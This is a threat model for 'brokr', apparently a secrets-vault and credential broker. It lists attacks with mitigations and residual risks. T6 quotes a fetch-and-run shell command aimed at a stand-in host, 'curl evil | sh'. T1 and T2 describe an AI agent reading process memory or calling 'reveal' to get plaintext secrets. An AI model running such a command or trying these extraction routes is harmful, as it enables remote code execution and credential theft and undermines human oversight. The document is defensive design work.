# Threat Model

## T1: AI agent extracts secrets from memory

- **Attack**: AI reads `brokr` process memory to extract decrypted secrets.
- **Mitigation**: Secrets are held in `SecretBytes`/`SecretString` wrappers that zeroize on drop. Decryption happens just before spawn and secrets are dropped immediately after.
- **Residual risk**: Root-level memory dumps can still capture transient secrets.

## T2: AI calls `brokr reveal` programmatically

- **Attack**: AI tries to call `brokr reveal` to get plaintext.
- **Mitigation**: `reveal` requires `stdin_is_real_tty()` + passphrase. AI processes typically lack a real TTY.
- **Residual risk**: None (if TTY check is reliable).

## T3: Attacker reads vault file from disk

- **Attack**: Attacker copies `~/.brokr/vault/store.jsonl.enc`.
- **Mitigation**: File is encrypted with AES-256-GCM. DEK is wrapped with master_kek (OS keychain) and reveal_kek (Argon2id). Attacker needs both vault file + OS keychain + passphrase.
- **Residual risk**: If OS keychain is compromised without passphrase, attacker can only `exec`, not `reveal`.

## T4: Tempfile race condition

- **Attack**: Attacker reads tempfile between creation and spawn.
- **Mitigation**: Tempfiles are created in `~/.brokr/run/` (0700), chmod 0600, and unlinked immediately after spawn. Subprocess retains fd.
- **Residual risk**: On multi-user systems with shared `/tmp` (not used by brokr) there would be risk; brokr uses `~/.brokr/run/`.

## T5: Ephemeral ssh-agent残留

- **Attack**: `ssh-agent` survives brokr crash; next process reuses socket.
- **Mitigation**: Socket path includes UUID + parent PID. Startup scrubs stale sockets. Linux uses `prctl(PR_SET_PDEATHSIG)`.
- **Residual risk**: `SIGKILL` of parent prevents cleanup; scrub on startup mitigates.

## T6: Malicious profile executes arbitrary commands

- **Attack**: User loads a profile with `binary = "/bin/sh -c 'curl evil | sh'"`.
- **Mitigation**: Binary path is validated (no shell metacharacters, must exist or be in PATH). First load requires TTY trust confirmation. Profile files must be 0600.
- **Residual risk**: User can still manually trust a malicious profile. Audit log records trust decisions.

## T7: Audit log tampering

- **Attack**: Attacker modifies `~/.brokr/audit/audit.log`.
- **Mitigation**: HMAC chain with key from OS keychain. `brokr audit verify` detects any modification.
- **Residual risk**: Attacker with OS keychain + vault file can recompute HMACs, but this is a complete compromise scenario.

## T8: Secret leakage via audit log

- **Attack**: Audit log accidentally contains plaintext secrets.
- **Mitigation**: Global redactor replaces any secret-looking values with `<REDACTED>` before writing.
- **Residual risk**: Redactor heuristics may miss novel secret formats.

## T9: Cross-platform downgrade

- **Attack**: Windows version has weaker security guarantees than Unix.
- **Mitigation**: Windows uses Credential Manager + ACL-only-current-user + FILE_FLAG_DELETE_ON_CLOSE. Experimental features are clearly marked.
- **Residual risk**: SSH agent bridge on Windows depends on OpenSSH-Win32 and may not fully match Unix security.

## Future Work

- **HostBook v2**: DRY host configuration for 50+ homogeneous hosts.
- **Agent token**: Short-lived tokens for CI/CD integration.
- **MCP server**: Model Context Protocol server for AI tool integration.
